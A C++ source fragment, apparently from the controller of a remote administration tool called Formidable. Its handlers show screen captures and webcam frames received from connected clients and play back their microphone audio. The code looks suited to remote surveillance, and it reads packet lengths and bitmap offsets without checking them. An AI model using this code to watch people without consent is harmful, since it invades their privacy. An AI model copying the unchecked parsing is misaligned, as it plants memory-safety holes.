void CommandHandler::HandleScreenCapture(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hDesktopDlg && IsWindow(client->hDesktopDlg)) {
        HWND hStatic = GetDlgItem(client->hDesktopDlg, IDC_STATIC_SCREEN);
        if (hStatic && pkg->arg1 > 0) {
            HBITMAP hBitmap = NULL;
            if (pkg->arg1 > 2 && pkg->data[0] == 'B' && pkg->data[1] == 'M') {
                BITMAPFILEHEADER* pBmpFileHeader = (BITMAPFILEHEADER*)pkg->data;
                BITMAPINFOHEADER* pBmpInfoHeader = (BITMAPINFOHEADER*)(pkg->data + sizeof(BITMAPFILEHEADER));
                BYTE* pBits = (BYTE*)pkg->data + pBmpFileHeader->bfOffBits;
                HDC hdc = GetDC(hStatic);
                hBitmap = CreateDIBitmap(hdc, pBmpInfoHeader, CBM_INIT, pBits, (BITMAPINFO*)pBmpInfoHeader, DIB_RGB_COLORS);
                ReleaseDC(hStatic, hdc);
            } else {
                HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pkg->arg1);
                LPVOID pBuf = GlobalLock(hGlobal);
                memcpy(pBuf, pkg->data, pkg->arg1);
                GlobalUnlock(hGlobal);
                IStream* pStream = NULL;
                if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
                    Bitmap* pBitmap = Bitmap::FromStream(pStream);
                    if (pBitmap && pBitmap->GetLastStatus() == Ok) {
                        pBitmap->GetHBITMAP(Color(0,0,0), &hBitmap);
                        delete pBitmap;
                    }
                    pStream->Release();
                }
            }

            if (hBitmap) {
                HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
                if (hOldBmp) DeleteObject(hOldBmp);
                SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBitmap);
                InvalidateRect(hStatic, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleVideoStream(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hVideoDlg && IsWindow(client->hVideoDlg)) {
        HWND hStatic = GetDlgItem(client->hVideoDlg, IDC_STATIC_VIDEO);
        if (hStatic && pkg->arg1 > 0) {
            HBITMAP hBitmap = NULL;
            HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pkg->arg1);
            if (hGlobal) {
                LPVOID pBuf = GlobalLock(hGlobal);
                memcpy(pBuf, pkg->data, pkg->arg1);
                GlobalUnlock(hGlobal);
                IStream* pStream = NULL;
                if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
                    Gdiplus::Bitmap* pBitmap = Gdiplus::Bitmap::FromStream(pStream);
                    if (pBitmap && pBitmap->GetLastStatus() == Gdiplus::Ok) {
                        pBitmap->GetHBITMAP(Gdiplus::Color(0,0,0), &hBitmap);
                        delete pBitmap;
                    }
                    pStream->Release();
                }
            }
            if (hBitmap) {
                HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
                if (hOldBmp) DeleteObject(hOldBmp);
                SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBitmap);
                InvalidateRect(hStatic, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleVoiceStream(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client->hWaveOut) {
        WAVEFORMATEX wfx = { 0 };
        wfx.wFormatTag = WAVE_FORMAT_PCM;
        wfx.nChannels = 1;
        wfx.nSamplesPerSec = 8000;
        wfx.wBitsPerSample = 16;
        wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
        wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
        wfx.cbSize = 0;
        waveOutOpen(&client->hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    }

    if (!client->hWaveOut) return;

    // PCM 数据直接播放
    WAVEHDR* pWh = (WAVEHDR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WAVEHDR));
    if (pWh) {
        pWh->lpData = (LPSTR)HeapAlloc(GetProcessHeap(), 0, pkg->arg1);
        if (pWh->lpData) {
            memcpy(pWh->lpData, pkg->data, pkg->arg1);
            pWh->dwBufferLength = pkg->arg1;
            waveOutPrepareHeader(client->hWaveOut, pWh, sizeof(WAVEHDR));
            waveOutWrite(client->hWaveOut, pWh, sizeof(WAVEHDR));
        } else {
            HeapFree(GetProcessHeap(), 0, pWh);
        }
    }
}

} // namespace Core
} // namespace Formidable
